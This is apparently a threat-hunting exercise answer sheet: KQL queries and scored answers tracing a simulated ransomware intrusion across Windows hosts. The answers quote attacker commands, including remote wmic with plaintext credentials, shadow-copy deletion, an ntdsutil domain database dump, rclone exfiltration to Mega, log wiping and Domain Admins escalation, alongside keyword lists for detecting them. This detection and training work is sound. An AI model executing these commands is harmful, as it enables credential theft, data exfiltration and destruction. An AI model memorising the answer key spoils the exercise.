@@ -1,0 +1,373 @@
+// Harborlight (Hunt 22, HL-INC-2026-0204) - queries by question
+// Workspace: Microsoft Sentinel (LAW-SilentCorridor). Table: HarborlightDental_CL. Filter on EventTime only.
+// Window for all queries: 2026-02-04 UTC. Questions without a query are judgment questions and are omitted.
+// Some queries were reconstructed from screenshots and logs; the screenshots under evidence/screenshots are the exact record.
+
+// ======================================================================
+// Q1.2 - The lure and the recipient
+// Answer: Invoice-HLD-2026-0291.7z, emily.grant@harborlightdental.com (platform-verified).
+// ======================================================================
+HarborlightDental_CL
+| where EventTime between (datetime(2026-02-04 00:00) .. datetime(2026-02-04 02:30))
+| where host has "BACKOFFICE-PC1"
+| where TargetFilename has_any ("Invoice", ".7z")
+| project EventTime, EventID, Image, TargetFilename
+| sort by EventTime asc
+
+// ======================================================================
+// Q1.3 - The command that ran the payload
+// Answer: rundll32 E:\review.dll,StartW at 02:25:06 (parent cmd.exe, Medium integrity).
+// ======================================================================
+HarborlightDental_CL
+| where EventTime between (datetime(2026-02-04 01:55) .. datetime(2026-02-04 02:45))
+| where host has "BACKOFFICE-PC1"
+| where EventID == 1
+| where Image has "rundll32"
+| project EventTime, Image, ParentImage, CommandLine, IntegrityLevel
+| sort by EventTime asc
+
+// ======================================================================
+// Q2.2 - Which process receives the injection
+// Answer: notepad.exe
+// ======================================================================
+HarborlightDental_CL
+| where EventTime between (datetime(2026-02-04 02:25) .. datetime(2026-02-04 02:40))
+| where host has "BACKOFFICE-PC1" and EventID in (8, 10)
+| extend SourceImage = extract(@"Name='SourceImage'>([^<]+)", 1, EventData_Xml),
+         TargetImage = extract(@"Name='TargetImage'>([^<]+)", 1, EventData_Xml)
+| where SourceImage has "rundll32"
+| project EventTime, EventID, SourceImage, TargetImage, granted_access, EventData_Xml
+| sort by EventTime asc
+
+// ======================================================================
+// Q3.1 - The UAC bypass payload
+// Answer: C:\Users\Public\taskhostw.exe (platform-verified).
+// ======================================================================
+HarborlightDental_CL
+| where EventTime between (datetime(2026-02-04 02:25) .. datetime(2026-02-04 02:45))
+| where host has "BACKOFFICE-PC1"
+| where EventID in (1, 13)
+| where TargetObject has "ms-settings"
+| project EventTime, EventID, Image, TargetObject, Details, IntegrityLevel
+| sort by EventTime asc
+
+// ======================================================================
+// Q3.2 - Real or fake taskhostw.exe
+// Answer: The full image path separates them: the real one is in C:\Windows\System32, the fake is in C:\Users\Public.
+// ======================================================================
+HarborlightDental_CL
+| where EventTime between (datetime(2026-02-04 00:00) .. datetime(2026-02-04 23:59))
+| where EventID == 1 and Image has "taskhostw.exe"
+| project EventTime, Image, TargetObject, Details, EventData_Xml
+
+// ======================================================================
+// Q3.3 - Which UAC bypass attempt succeeded
+// Answer: The second one, 2026-02-04T02:42:39Z.
+// ======================================================================
+HarborlightDental_CL
+| where EventTime between (datetime(2026-02-04 02:00) .. datetime(2026-02-04 02:45))
+| where host has "BACKOFFICE-PC1"
+| where Image contains "fod"
+| project EventTime, Image, ParentImage, CommandLine, IntegrityLevel
+| sort by EventTime asc
+
+// ======================================================================
+// Q4.1 - Which process is injected on every host
+// Answer: C:\Users\Public\taskhostw.exe injecting into C:\Windows\System32\spoolsv.exe, on 3 hosts.
+// ======================================================================
+HarborlightDental_CL
+| where EventTime between (datetime(2026-02-04 02:42) .. datetime(2026-02-04 23:59))
+| where EventID in (8, 10)
+| extend SourceImage = extract(@"Name='SourceImage'>([^<]+)", 1, EventData_Xml),
+         TargetImage = extract(@"Name='TargetImage'>([^<]+)", 1, EventData_Xml)
+| where TargetImage has "spoolsv"
+| project EventTime, host, EventID, SourceImage, TargetImage, granted_access
+| sort by EventTime asc
+
+// ======================================================================
+// Q5.2 - Credential Manager reads: attack or noise
+// Answer: Noise.
+// ======================================================================
+HarborlightDental_CL
+| where EventTime between (datetime(2026-02-04 00:00) .. datetime(2026-02-04 23:59))
+| where EventCode == 5379
+| project EventTime, Account_Name, EventCode
+| summarize count() by bin(EventTime, 1hr)
+| sort by EventTime asc
+
+// ======================================================================
+// Q5.3 - Which process reads LSASS
+// Answer: spoolsv.exe, lsass.exe
+// ======================================================================
+HarborlightDental_CL
+| where EventTime between (datetime(2026-02-04 02:30) .. datetime(2026-02-04 06:00))
+| where EventID == 10
+| extend SourceImage = extract(@"Name='SourceImage'>([^<]+)", 1, EventData_Xml),
+         TargetImage = extract(@"Name='TargetImage'>([^<]+)", 1, EventData_Xml),
+         SourceUser  = extract(@"Name='SourceUser'>([^<]+)", 1, EventData_Xml)
+| where TargetImage has "lsass"
+| summarize hits=count(), first_seen=min(EventTime) by host, SourceImage, SourceUser, granted_access
+| sort by first_seen asc
+
+// ======================================================================
+// Q5.5 - Which account and password
+// Answer: Account Emily.Grant, password Dental2024! (credential in use from 03:34:09).
+// ======================================================================
+HarborlightDental_CL
+| where EventTime between (datetime(2026-02-04 02:49) .. datetime(2026-02-04 04:40))
+| where EventID == 1
+| where CommandLine has_any ("password", "/user", "/p:", " -p ", "-u ", "net use", "wmic", "psexec", "runas", "cmdkey", "schtasks")
+| project EventTime, host, Image, ParentImage, CommandLine
+| sort by EventTime asc
+
+// ======================================================================
+// Q6.2 - Hop one
+// Answer: BACKOFFICE-PC1 → HL-FS01, 172.16.0.8, about 03:33–03:34. Correction: I submitted the hop-two values (172.16.0.7, 04:28:22) and the platform still gave 75 points.
+// ======================================================================
+// Same query as Q5.5.
+
+// ======================================================================
+// Q6.3 - Hop two
+// Answer: HL-FS01 → ADDC01, 172.16.0.7, 04:28:22 (platform-verified, 75 points).
+// ======================================================================
+HarborlightDental_CL
+| where EventTime between (datetime(2026-02-04 02:49) .. datetime(2026-02-04 04:40))
+| where EventID == 1
+| where CommandLine has_any ("password", "/user", "/p:", " -p ", "-u ", "net use", "wmic", "psexec", "runas", "cmdkey", "schtasks")
+| project EventTime, host, Image, ParentImage, CommandLine
+| sort by EventTime asc
+
+// ======================================================================
+// Q6.4 - Does traffic flow only one way
+// Answer: wmic /node:172.16.0.7 /user:HARBORLIGHT\Emily.Grant /password:Dental2024! process call create "cmd /c vssadmin delete shadows /all /quiet" (platform-verified, 150 points).
+// ======================================================================
+HarborlightDental_CL
+| where EventTime between (datetime(2026-02-04 04:30) .. datetime(2026-02-04 05:15))
+| where host has "ADDC01" and EventID == 1
+| where CommandLine has_any ("wmic", "vssadmin")
+| project EventTime, Image, ParentImage, CommandLine
+| sort by EventTime asc
+
+// ======================================================================
+// Q7.1 - Taking the whole directory
+// Answer: cmd /c "ntdsutil \"ac i ntds\" \"ifm\" \"create full C:\Windows\Temp\ntds\" quit quit" (platform-verified, 150 points).
+// ======================================================================
+HarborlightDental_CL
+| where EventTime between (datetime(2026-02-04 04:28) .. datetime(2026-02-04 05:15))
+| where host has "ADDC01" and EventID == 1
+| where CommandLine has_any ("ntdsutil", "ntds", "ifm", "diskshadow", "esentutl", "vssadmin create", "shadow", "reg save")
+| project EventTime, Image, ParentImage, CommandLine
+| sort by EventTime asc
+
+// ======================================================================
+// Q8.2 - Which hosts get their logs cleared
+// Answer: ADDC01, BACKOFFICE-PC1, HL-FS01. Correction: I first submitted only ADDC01, which the platform accepted.
+// ======================================================================
+HarborlightDental_CL
+| where EventTime between (datetime(2026-02-04 04:30) .. datetime(2026-02-04 05:30))
+| where EventID == 1
+| where CommandLine has_any ("wevtutil", "Clear-EventLog", "Remove-EventLog", "Limit-EventLog")
+| project EventTime, host, Image, ParentImage, CommandLine
+| distinct host
+
+// ======================================================================
+// Q8.3 - One channel cleared everywhere
+// Answer: Security (the platform result for this question was not recorded).
+// ======================================================================
+// From the Q8.2 export; no separate query run in Sentinel.
+
+// ======================================================================
+// Q8.4 - Which wipe is most thorough, and in what pattern
+// Answer: All three hosts got the same 16-channel wipe, staggered. Correction: I submitted “BACKOFFICE-PC1, HL-FS01, ADDC01, simultaneous” and the platform gave 100 points.
+// ======================================================================
+HarborlightDental_CL
+| where EventTime between (datetime(2026-02-04 05:00) .. datetime(2026-02-04 05:30))
+| where EventID == 1 and CommandLine has "wevtutil" and CommandLine has " cl"
+| extend Channel = extract(@"cl\s+""?([^""]+)""?", 1, CommandLine)
+| summarize channels = dcount(Channel), first_cmd = min(EventTime), last_cmd = max(EventTime) by host, burst = bin(EventTime, 1m)
+| where channels == 16
+| sort by first_cmd asc
+
+// ======================================================================
+// Q9.1 - Is exfiltration before, after or during the anti-forensics work
+// Answer: (c) During / overlapping (platform-verified, 10 points). Discrepancy: the Mega transfer itself ended about 69 minutes before the first log wipe.
+// ======================================================================
+let wipe = HarborlightDental_CL
+| where EventTime between (datetime(2026-02-04 05:00) .. datetime(2026-02-04 05:30))
+| where EventID == 1 and CommandLine has "wevtutil" and CommandLine has " cl"
+| summarize wipe_start=min(EventTime), wipe_end=max(EventTime) by host;
+let outbound = HarborlightDental_CL
+| where EventTime between (datetime(2026-02-04 03:00) .. datetime(2026-02-04 05:30))
+| where EventID == 3
+| extend Kind = case(Image =~ @"C:\ProgramData\Microsoft\MsMpEng.exe", "Mega transfer",
+                     DestinationIp in ("104.21.30.237", "172.67.174.46"), "C2 / other external", "")
+| where Kind != "";
+outbound
+| join kind=inner wipe on host
+| extend during_wipe = EventTime between (wipe_start .. wipe_end)
+| summarize events=count(), during_wipe_events=countif(during_wipe),
+            first_seen=min(EventTime), last_seen=max(EventTime) by host, Kind, wipe_start, wipe_end
+
+// ======================================================================
+// Q9.2 - What is leaving, and disguised as what
+// Answer: rclone, C:\ProgramData\Microsoft\MsMpEng.exe. I submitted the full command line plus “rclone.exe masquerading as MsMpEng.exe, the exfiltration tool disguised as Windows Defender's service binary”.
+// ======================================================================
+HarborlightDental_CL
+| where EventTime between (datetime(2026-02-04 00:00) .. datetime(2026-02-04 23:59))
+| where host has "HL-FS01" and EventID == 1
+| where CommandLine contains "MsMpEng" or CommandLine contains "masquerade"
+| project EventTime, Image, ParentImage, CommandLine
+
+// ======================================================================
+// Q9.3 - What moves, and where to
+// Answer: C:\Shares → mega:HARBORLIGHT-exfil -q (platform-verified, +75 points). I submitted C:\ProgramData\Microsoft\MsMpEng.exe, C:\Shares mega:HARBORLIGHT-exfil -q.
+// ======================================================================
+HarborlightDental_CL
+| where EventTime between (datetime(2026-02-04 00:00) .. datetime(2026-02-04 23:59))
+| where CommandLine has "rclone"
+| project EventTime, Image, CommandLine, ParentImage
+
+// ======================================================================
+// Q9.4 - Whose account receives it
+// Answer: jwilson.vhr@proton.me
+// ======================================================================
+HarborlightDental_CL
+| where EventTime between (datetime(2026-02-04 00:00) .. datetime(2026-02-04 23:59))
+| where CommandLine contains "proton.me"
+| project EventTime, CommandLine
+
+// ======================================================================
+// Q10.2 - Which host loses its recovery options
+// Answer: HL-FS01 gets the full treatment; ADDC01 gets a partial one. Method note: my first query was invalid and I corrected it.
+// ======================================================================
+HarborlightDental_CL
+| where EventTime between (datetime(2026-02-04 00:00) .. datetime(2026-02-04 23:59))
+| where EventID == 1
+| where CommandLine has_any ("vssadmin", "shadowcopy", "bcdedit", "wbadmin", "recoveryenabled", "shadowstorage")
+| extend Technique = case(
+    CommandLine has "vssadmin" and CommandLine has "delete", "vssadmin delete shadows",
+    CommandLine has "shadowcopy", "wmic shadowcopy delete",
+    CommandLine has "bcdedit", "bcdedit",
+    CommandLine has "wbadmin", "wbadmin",
+    "other")
+| summarize techniques = dcount(Technique), list = make_set(Technique), runs = count(), first_seen = min(EventTime) by host
+
+// ======================================================================
+// Q10.3 - Which techniques are used together on HL-FS01
+// Answer: I submitted vssadmin delete shadows /all /quiet, wmic shadowcopy delete /nointeractive, wbadmin delete catalog (platform: solved, 75 points). Correction: the platform's three techniques are vssadmin, bcdedit and wbadmin.
+// ======================================================================
+HarborlightDental_CL
+| where EventTime between (datetime(2026-02-04 00:00) .. datetime(2026-02-04 23:59))
+| where host has "HL-FS01" and EventID == 1
+| where CommandLine has_any ("vssadmin", "shadowcopy", "bcdedit", "wbadmin", "recoveryenabled", "shadowstorage")
+| project EventTime, Image, ParentImage, CommandLine
+| sort by EventTime asc
+
+// ======================================================================
+// Q10.4 - Does the sequence run more than once
+// Answer: It repeats, 04:05:26 (platform: solved, 100 points).
+// ======================================================================
+HarborlightDental_CL
+| where EventTime between (datetime(2026-02-04 00:00) .. datetime(2026-02-04 23:59))
+| where host has "HL-FS01" and EventID == 1
+| where CommandLine has_any ("vssadmin", "shadowcopy", "bcdedit", "wbadmin", "recoveryenabled", "shadowstorage")
+| project EventTime, Image, ParentImage, CommandLine
+| sort by EventTime asc
+| distinct EventTime, CommandLine
+
+// ======================================================================
+// Q11.2 - Is there a second way back in
+// Answer: OneDriveSync.exe, C:\Users\Public\OneDriveSync.exe (on ADDC01; platform result not recorded).
+// ======================================================================
+// Exported to Q11.2.csv; the Sentinel query was not recorded.
+
+// ======================================================================
+// Q11.3 - Is there a third
+// Answer: wsync.exe, dropped by C:\Users\Public\taskhostw.exe, on HL-FS01 (platform result not recorded).
+// ======================================================================
+HarborlightDental_CL
+| where EventTime between (datetime(2026-02-04 00:00) .. datetime(2026-02-04 23:59))
+| where host == "HL-FS01" and EventID in (1, 11)
+| where Image has "wsync" or TargetFilename has "wsync"
+| project EventTime, EventID, Image, TargetFilename, ParentImage
+
+// ======================================================================
+// Q12.1 - Where the backdoors phone home
+// Answer: cdn.cloud-endpoint.net, resolving to the Cloudflare IPs 104.21.30.237 and 172.67.174.46 (platform-verified, 150 points). I also listed ADDC01.Harborlight.local; the platform accepted it, but it is the internal DC and not C2.
+// ======================================================================
+// Exported to Q12.1.csv; the DNS summary query was not recorded.
+
+// ======================================================================
+// Q12.2 - One-off or sustained
+// Answer: Persistent, 443, 80 (platform-verified, 150 points).
+// ======================================================================
+HarborlightDental_CL
+| where EventTime between (datetime(2026-02-04 00:00) .. datetime(2026-02-04 23:59))
+| where EventID == 3
+| where DestinationIp in ("104.21.30.237", "172.67.174.46")
+| summarize connections = count(),
+            port_80 = countif(DestinationPort == 80),
+            port_443 = countif(DestinationPort == 443),
+            first_seen = min(EventTime), last_seen = max(EventTime),
+            hosts = dcount(host), processes = dcount(Image)
+
+// ======================================================================
+// Q12.3 - Is it really over
+// Answer: Confirmed. The log shows C2 callbacks to the Cloudflare IPs until 18:47:29 UTC, about 13 hours after the 05:23 encryption, so attacker access lasted at least 16 hours from first contact.
+// ======================================================================
+// Same query as Q12.2.
+
+// ======================================================================
+// Q13.1 - The attacker end goal
+// Answer: (b) Durable domain-level persistence (platform-verified, correct).
+// ======================================================================
+HarborlightDental_CL
+| where EventTime between (datetime(2026-02-04 00:00) .. datetime(2026-02-04 23:59))
+| where EventCode in (4728, 4732)
+| project EventTime, host, EventCode, CommandLine, TargetObject, TargetFilename
+| sort by EventTime asc
+
+// ======================================================================
+// Q13.2 - The backdoor built into the domain
+// Answer: Account svc_sql, password Summer2024! (platform-verified, 75 points).
+// ======================================================================
+HarborlightDental_CL
+| where EventTime between (datetime(2026-02-04 00:00) .. datetime(2026-02-04 23:59))
+| where CommandLine has "svc_sql"
+| project EventTime, host, Image, ParentImage, CommandLine
+
+// ======================================================================
+// Q13.3 - Which privilege-escalation attempt worked
+// Answer: cmd /c "net localgroup Administrators svc_sql /add" and powershell -c "Add-ADGroupMember -Identity 'Domain Admins' -Members svc_sql" (platform: correct).
+// ======================================================================
+HarborlightDental_CL
+| where EventTime between (datetime(2026-02-04 00:00) .. datetime(2026-02-04 23:59))
+| where CommandLine has "svc_sql"
+| project EventTime, CommandLine
+
+// ======================================================================
+// Q13.4 - A second name shows up: is it real
+// Answer: Not real. akira_svc was only queried with net user akira_svc /domain (platform: solved, 150 points).
+// ======================================================================
+HarborlightDental_CL
+| where EventTime between (datetime(2026-02-04 05:00) .. datetime(2026-02-04 23:59:00))
+| where CommandLine has ("akira")
+| order by EventTime asc
+
+// ======================================================================
+// Q14.2 - The ransom note and how many times it lands
+// Answer: akira_readme.txt, 128 (platform: solved).
+// ======================================================================
+HarborlightDental_CL
+| where EventTime between (datetime(2026-02-04 00:00) .. datetime(2026-02-04 23:59))
+| where EventID == 11 and TargetFilename has "akira_readme"
+| summarize count() by host
+
+// ======================================================================
+// Q14.3 - What is actually encrypted
+// Answer: .akira, 27 distinct files (platform result not recorded).
+// ======================================================================
+HarborlightDental_CL
+| where EventTime between (datetime(2026-02-04 00:00) .. datetime(2026-02-04 23:59))
+| where EventID == 11 and TargetFilename endswith ".akira"
+| summarize distinct_files = dcount(TargetFilename), events = count()
